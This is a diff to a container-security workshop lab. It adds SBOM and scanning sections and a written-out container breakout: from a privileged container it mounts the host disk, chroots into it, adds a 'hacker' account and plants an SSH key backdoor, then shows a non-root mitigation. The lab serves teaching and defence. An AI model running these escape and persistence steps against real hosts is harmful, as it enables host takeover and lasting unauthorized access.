@@ -5,12 +5,12 @@ Welcome to my Container Security 101 workshop! If you'd like to sign up, you can
 
 ## Agenda
 
-1. Create secure and insecure container images.
-1. Perform container image signing.
-1. Create SBOMs.
-1. Vulnerability scan the images.
-1. Dig into the container image manifests, indexes, and layers.
-1. Break out of a misconfigured container.
+1. [Create secure and insecure container images](creating-images)
+1. [Perform container image signing](image-signing)
+1. [Create SBOMs](making-a-software-bill-of-materials)
+1. [Vulnerability scan the images](vulnerability-scanning-images)
+1. [Dig into the container image manifests, layers, and configurations](container-image-components)
+1. [Break out of a misconfigured container](ready-set-break)
 
 ## Getting started
 
@@ -604,7 +604,7 @@ If you'd like more of an introduction to Reference Types, I recommend the chaing
 [here](https://www.chainguard.dev/unchained/intro-to-oci-reference-types).
 ```
 
-## Vulnerability scanning images
+## Making a Software Bill of Materials
 
 Now that we have a docker image, we want to have a structured way to know what's in it, and if there are any
 vulnerabilities that may need tending to. There are a few different approaches we can take here, but the most modern
@@ -655,9 +655,12 @@ You also may be asking, which of the above standard SBOM formats did this output
 none of the above. When you run with the `json` output format (like we did above) `syft` uses a proprietary SBOM format
 to "get as much information out of Syft as possible!"
 
-Now, why did we use the `json` output format? Well, in this case we would like to pass this SBOM file into another tool
-called [`grype`](https://github.com/anchore/grype) to do some vulnerability scanning. Since both tools are developed and
-maintained by Anchore, you can see why this format is the _only_ SBOM format which is supported to do a `grype` scan.
+## Vulnerability scanning images
+
+Now, why did we use the `json` output format for our SBOM? Well, in this case we would like to pass this SBOM file into
+another tool called [`grype`](https://github.com/anchore/grype) to do some vulnerability scanning. Since both tools are
+developed and maintained by Anchore, you can see why this format is the _only_ SBOM format which is supported to do a
+`grype` scan.
 
 ```{code-block} console
 $ docker run -v "$(pwd):/tmp" anchore/grype sbom:example-secure.sbom.json --output json --file example-secure.vulns.json
@@ -876,25 +879,124 @@ reasonable approaches to prevent this, I highly recommend [multi-stage
 builds](https://docs.docker.com/build/building/multi-stage/) and providing secrets at build time safely using
 [environment variables](https://github.com/moby/buildkit/pull/1534).
 
-```{seealso}
+```{note}
 As a brief aside, if using `curl` to custom-create API queries isn't your thing, but you still need to take a peek under
 the covers from time to time, I recommend using
 [`crane`](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md).
 ```
 
-## Read, Set, Break!
+```{seealso}
+Want more like the above? Well, to start I recommend checking out
+[this](https://raesene.github.io/blog/2023/02/11/Fun-with-Containers-adding-tracking-to-your-images/) incredibly
+interesting blog posts about how OCI images can be modified to track when it's pulled, and anything online from a group
+that calls themselves [SIG-Honk](https://www.youtube.com/results?search_query=sig-honk).
+```
 
-Alright, now it's time for the grand finale, a container escape!
+## Ready, Set, Break!
 
-### Successful breakout
+Alright, now it's time for container escape.
 
-CAP_SYS_ADMIN? Mounted docker sock?
+First, we'll run by running standard ubuntu container with some additional privileges, sometimes used when trying to
+troubleshoot permissions issues:
+
+```{code-block} console
+$ docker run -it --privileged ubuntu:20.04
+```
+
+Then, by abusing the additional access from the `--privileged` argument, we can mount the host filesystem, which in my
+example is on `/dev/xvda1`:
+
+```{code-block} console
+---
+emphasize-lines: 5-7
+---
+$ mount | grep '/dev/'
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
+/dev/xvda1 on /etc/resolv.conf type ext4 (rw,relatime,discard)
+/dev/xvda1 on /etc/hostname type ext4 (rw,relatime,discard)
+/dev/xvda1 on /etc/hosts type ext4 (rw,relatime,discard)
+devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+$ ls -al /home # Nothing in the home directory in the container
+total 8
+drwxr-xr-x 2 root root 4096 Apr 15  2020 .
+drwxr-xr-x 1 root root 4096 Apr 26 02:40 ..
+$ mount /dev/xvda1 /mnt
+```
+
+Now, we can `chroot` into that filesystem and we are effectively on the host computer. Let's see see if we can find
+anything juicy, and maybe drop a quick backdoor for ourselves later:
+
+```{code-block} console
+---
+emphasize-lines: 6,20
+---
+$ chroot /mnt
+$ ls -al /home # We can now see /home/ubuntu/ on the host filesystem
+total 12
+drwxr-xr-x  3 root   root   4096 Apr 26 00:43 .
+drwxr-xr-x 19 root   root   4096 Apr 26 00:43 ..
+drwxr-xr-x  5 ubuntu ubuntu 4096 Apr 26 00:54 ubuntu
+$ sudo useradd hacker
+sudo: unable to resolve host 86ffe706cfb4: Temporary failure in name resolution
+$ sudo passwd hacker
+sudo: unable to resolve host 86ffe706cfb4: Temporary failure in name resolution
+New password:
+Retype new password:
+passwd: password updated successfully
+$ # Now, let's drop our public key into the ubuntu user's authorized_keys file so I have another way back in
+$ echo 'ssh-ed25519 AAAAC3NzAAAAAAAAATE5AAAAIH/JRUsEfBrjsVQmeyBrjsVQmeyBrjsVQmeyBrjsVQYIX example-backdoor' >> /home/ubuntu/.ssh/authorized_keys
+$ exit
+$ exit
+exit
+```
+
+And finally, we can see evidence of the break-in on the host system now:
+
+```{code-block} console
+$ tail -3 /etc/passwd
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+hacker:x:1001:1001::/home/hacker:/bin/sh
+$ tail -1 /home/ubuntu/.ssh/authorized_keys
+ssh-ed25519 AAAAC3NzAAAAAAAAATE5AAAAIH/JRUsEfBrjsVQmeyBrjsVQmeyBrjsVQmeyBrjsVQYIX example-backdoor
+```
 
 ### Fix
 
-### Failed breakout
+How do we prevent these sort of issues? Specific to this breakout, even if we continue to allow `--privileged`, we can
+mitigate some of the impact by requiring that non-root users be used at runtime. For instance:
 
-## Container Breakout
+```{code-block} bash
+docker run -it -u 1001 --privileged ubuntu:20.04
+```
+
+Now when we go to mount the host filesystem or run `chroot`, we get an error:
+
+```{code-block} console
+---
+emphasize-lines: 14
+---
+$ mount | grep '/dev/'
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
+/dev/xvda1 on /etc/resolv.conf type ext4 (rw,relatime,discard)
+/dev/xvda1 on /etc/hostname type ext4 (rw,relatime,discard)
+/dev/xvda1 on /etc/hosts type ext4 (rw,relatime,discard)
+devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+$ ls -al /home
+total 8
+drwxr-xr-x 2 root root 4096 Apr 15  2020 .
+drwxr-xr-x 1 root root 4096 Apr 26 02:56 ..
+$ mount /dev/xvda1 /mnt
+mount: only root can do that
+$ chroot /mnt
+chroot: cannot change root directory to '/mnt': Operation not permitted
+```
+
+Breakout averted! Great job 😊
 
 ## Conclusion
 
@@ -903,7 +1005,8 @@ If you've made it this far, congratulations!
 Have any ideas or feedback on this lab? Connect with me [on LinkedIn](https://linkedin.com/in/jonzeolla/) and send me a
 message.
 
-If you'd like more content like this, check out SANS [SEC540 class](http://sans.org/sec540) for 5 days of Cloud Security and DevSecOps training.
+If you'd like more content like this, check out SANS [SEC540 class](http://sans.org/sec540) for 5 full days of Cloud
+Security and DevSecOps training.
 
 ## Cleanup
 
